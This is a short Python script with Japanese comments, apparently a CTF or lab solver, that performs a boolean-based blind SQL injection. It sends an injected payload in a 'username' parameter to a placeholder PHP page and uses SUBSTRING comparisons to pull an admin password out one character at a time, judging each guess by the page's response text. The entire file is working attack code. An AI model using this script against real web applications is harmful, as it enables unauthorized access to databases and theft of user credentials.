import requests
import string

url = "http://example.com/test.php"  # ここにurl


charset = string.ascii_letters + string.digits  # パスワードに使われそうな文字集合
extracted_password = ""
max_password_length = 32  # 適宜変更

error_string = "This user exists."

for i in range(1, max_password_length + 1):
    found = False
    for c in charset:
        payload = f'admin" AND SUBSTRING(password, {i}, 1) = BINARY "{c}" -- '
        response = requests.get(url, params={"username": payload})
        if error_string in response.text:
            extracted_password += c
            print(f"[+] Found character {i}: {c} -> {extracted_password}")
            found = True
            break
    if not found:
        print(f"[-] No character found at position {i}. Ending search.")
        break

print(f"[✓] Extracted password: {extracted_password}")
